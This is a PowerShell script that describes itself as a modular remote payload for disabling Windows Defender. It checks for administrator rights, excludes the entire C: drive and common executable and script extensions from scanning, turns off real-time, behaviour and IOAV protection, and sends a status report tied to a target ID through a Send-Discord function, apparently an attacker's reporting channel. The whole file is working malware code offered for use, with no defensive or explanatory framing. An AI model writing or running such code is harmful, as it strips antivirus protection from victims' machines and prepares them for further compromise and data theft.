# ============================================================
# Disable Defender for Windows - Modular Remote Payload
# ============================================================
# Adds exclusions and attempts to disable protections
# Note: Tamper Protection may block some actions
# ============================================================

$sysid = Get-SystemID

# Check for Admin privileges
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Send-Discord "⚠️ **Defender Bypass Failed**`nTarget: $sysid`nError: Administrator privileges required."
    exit
}

$results = @()

try {
    # Add exclusion for entire C: drive
    Add-MpPreference -ExclusionPath "C:\" -Force
    $results += "✅ Added C:\\ exclusion"
} catch {
    $results += "⚠️ C:\\ exclusion: $($_.Exception.Message)"
}

try {
    # Add exclusion for common payload extensions
    Add-MpPreference -ExclusionExtension ".exe", ".ps1", ".bat", ".vbs" -Force
    $results += "✅ Added extension exclusions"
} catch {
    $results += "⚠️ Extension exclusions failed"
}

try {
    # Disable real-time monitoring (may fail if Tamper Protection on)
    Set-MpPreference -DisableRealtimeMonitoring $true -Force
    $results += "✅ Disabled Real-Time Protection"
} catch {
    $results += "❌ RTP (Tamper Protection likely on)"
}

try {
    # Disable behavior monitoring
    Set-MpPreference -DisableBehaviorMonitoring $true -Force
    $results += "✅ Disabled Behavior Monitoring"
} catch {
    $results += "⚠️ Behavior Monitoring: protected"
}

try {
    # Disable IOAV protection
    Set-MpPreference -DisableIOAVProtection $true -Force
    $results += "✅ Disabled IOAV Protection"
} catch {
    $results += "⚠️ IOAV: protected"
}

$report = "🛡️ **Defender Bypass on $sysid**`n`n"
foreach ($r in $results) {
    $report += "• $r`n"
}

Send-Discord $report
